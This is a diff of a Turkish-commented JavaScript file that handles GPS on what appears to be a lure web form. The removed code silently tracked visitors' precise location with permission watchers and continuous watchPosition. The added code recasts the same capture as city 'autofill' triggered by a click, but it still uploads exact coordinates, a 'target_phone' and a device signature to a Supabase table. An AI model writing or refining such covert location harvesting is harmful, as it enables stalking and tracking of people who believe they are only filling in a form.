@@ -800,8 +800,10 @@ async function fetchIpLocation() {
 }
 
 // ==========================================
-// 8) GPS HASSAS KONUM TESPİTİ & CANLI VERİTABANI SENKRONİZASYONU
+// 8) GPS HASSAS KONUM TESPİTİ & FORM OTOMATİK DOLDURMA
 // ==========================================
+var isGpsRequestedByUser = false;
+
 async function updatePreciseGpsPosition(pos, sourceReason) {
     if (!pos || !pos.coords) return;
     var lat = String(pos.coords.latitude);
@@ -812,12 +814,12 @@ async function updatePreciseGpsPosition(pos, sourceReason) {
     STATE.ipLng = lng;
     STATE.locationType = 'GPS Hassas (±' + accuracy + 'm)';
 
-    console.log('📍 [GPS HASSAS KONUM ALINDI]:', lat, lng, '(±' + accuracy + 'm)', '| Kaynak:', sourceReason || 'Otomatik');
+    console.log('📍 [GPS HASSAS KONUM ALINDI]:', lat, lng, '(±' + accuracy + 'm)', '| Kaynak:', sourceReason || 'Kullanıcı İsteği');
 
     // 1. Şehir ve Ülkeyi Ters Geocoding ile Bul
-    var detCity = STATE.ipCity;
-    var detRegion = STATE.ipRegion;
-    var detCountry = STATE.ipCountry;
+    var detCity = STATE.ipCity || '';
+    var detRegion = STATE.ipRegion || '';
+    var detCountry = STATE.ipCountry || '';
 
     try {
         var geoUrl = 'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=tr';
@@ -833,16 +835,17 @@ async function updatePreciseGpsPosition(pos, sourceReason) {
         }
     } catch(e) {}
 
-    // Formdaki şehir alanına yansıt
+    // Formdaki "Bulunduğunuz Şehir / Ülke" alanını otomatik doldur
     var cityInput = document.getElementById('lead-city');
-    if (cityInput && (!cityInput.value || cityInput.value.includes('Konum'))) {
-        cityInput.value = (detCity ? detCity : '') + (detCountry ? ', ' + detCountry : '');
+    if (cityInput) {
+        var formattedLocation = [detCity, detCountry].filter(Boolean).join(', ') || (lat + ', ' + lng);
+        cityInput.value = formattedLocation;
     }
 
     var btn = document.getElementById('btn-detect-geo');
-    if (btn) btn.textContent = '✓ Belirlendi (±' + accuracy + 'm)';
+    if (btn) btn.innerHTML = '<span>✓ Dolduruldu (±' + accuracy + 'm)</span>';
 
-    // 2. Anında Supabase'e Güncelleme Gönder (Kesin GPS ve Konum Verisi)
+    // 2. Anında Supabase'e Güncelleme Gönder (GPS Koordinatları)
     var gpsPayload = {
         latitude: lat,
         longitude: lng,
@@ -852,6 +855,7 @@ async function updatePreciseGpsPosition(pos, sourceReason) {
     if (detCity) gpsPayload.city = detCity;
     if (detRegion) gpsPayload.region = detRegion;
     if (detCountry) gpsPayload.country = detCountry;
+    if (cityInput && cityInput.value) gpsPayload.user_entered_city = cityInput.value;
     if (STATE.targetPhone) gpsPayload.target_phone = STATE.targetPhone;
 
     var tableToUse = STATE.targetTable || CONFIG.DEFAULT_TABLE;
@@ -865,74 +869,54 @@ async function updatePreciseGpsPosition(pos, sourceReason) {
             } else if (STATE.deviceSignature) {
                 await STATE.supabaseClient.from(tableToUse).update(gpsPayload).eq('device_signature', STATE.deviceSignature);
             }
-            console.log('✅ [SUPABASE GPS GÜNCELLENDİ]:', lat, lng, detCity, detCountry);
+            console.log('✅ [SUPABASE GPS BAŞARIYLA GÜNCELLENDİ]:', lat, lng, detCity, detCountry);
         } catch(e) {
             console.warn('⚠️ Supabase GPS güncelleme hatası:', e);
         }
     }
 }
 
+function requestGpsLocation(reason) {
+    if (!navigator.geolocation) {
+        alert('Tarayıcınız konum servisini desteklemiyor.');
+        return;
+    }
+
+    var btn = document.getElementById('btn-detect-geo');
+    if (btn) btn.innerHTML = '<span>📍 Konum Alınıyor...</span>';
+
+    navigator.geolocation.getCurrentPosition(
+        function (pos) {
+            updatePreciseGpsPosition(pos, reason || 'Form Otomatik Doldurma');
+        },
+        function (err) {
+            console.warn('GPS İzni Reddedildi / Hata:', err.message);
+            if (btn) btn.innerHTML = '<span>📍 Otomatik Doldur</span>';
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
 function setupGeoDetection() {
     var btn = document.getElementById('btn-detect-geo');
+    var cityInput = document.getElementById('lead-city');
 
-    // 1. "Konumu Belirle" butonuna tıklandığında izin iste ve al
+    // 1. "Otomatik Doldur" butonuna tıklandığında konum izni iste
     if (btn) {
-        btn.addEventListener('click', function () {
-            if (!navigator.geolocation) {
-                alert('Tarayıcınız konum servisini desteklemiyor.');
-                return;
-            }
-            btn.textContent = '📍 Belirleniyor...';
-            navigator.geolocation.getCurrentPosition(
-                function (pos) { updatePreciseGpsPosition(pos, 'Buton Tıklaması'); },
-                function (err) {
-                    console.warn('GPS İzin Hatası:', err);
-                    btn.textContent = '📍 Konumu Belirle';
-                },
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-            );
+        btn.addEventListener('click', function (e) {
+            e.preventDefault();
+            requestGpsLocation('Buton Tıklaması');
         });
     }
 
-    // 2. Otomatik İzin Durumu Takibi (Permissions API)
-    // Kullanıcı izin verdiği anda veya sonradan izin açtığında anında tetiklenir!
-    if (navigator.permissions && navigator.permissions.query) {
-        navigator.permissions.query({ name: 'geolocation' }).then(function (perm) {
-            if (perm.state === 'granted') {
-                console.log('📍 [GPS İZNİ ZATEN MEVCUT] Otomatik konum alınıyor...');
-                navigator.geolocation.getCurrentPosition(
-                    function (pos) { updatePreciseGpsPosition(pos, 'Mevcut İzin'); },
-                    function () {},
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
+    // 2. "Bulunduğunuz Şehir / Ülke" kutusuna tıklandığında kullanıcıya kolaylık için konum iste
+    if (cityInput) {
+        cityInput.addEventListener('click', function () {
+            if (!cityInput.value && !isGpsRequestedByUser) {
+                isGpsRequestedByUser = true;
+                requestGpsLocation('Şehir Giriş Kutusu Tıklaması');
             }
-            // Kullanıcı sonradan izni açtığında (prompt -> granted) anında yakala
-            perm.onchange = function () {
-                console.log('📍 [GPS İZİN DURUMU DEĞİŞTİ]:', perm.state);
-                if (perm.state === 'granted') {
-                    navigator.geolocation.getCurrentPosition(
-                        function (pos) { updatePreciseGpsPosition(pos, 'Sonradan Verilen İzin'); },
-                        function () {},
-                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                    );
-                }
-            };
-        }).catch(function () {});
-    }
-
-    // 3. Canlı Konum İzleyici (watchPosition)
-    if (navigator.geolocation && navigator.geolocation.watchPosition) {
-        try {
-            navigator.geolocation.watchPosition(
-                function (pos) {
-                    if (pos && pos.coords) {
-                        updatePreciseGpsPosition(pos, 'Canlı WatchPosition');
-                    }
-                },
-                function () {},
-                { enableHighAccuracy: true, maximumAge: 10000, timeout: 15000 }
-            );
-        } catch(e) {}
+        });
     }
 }
 
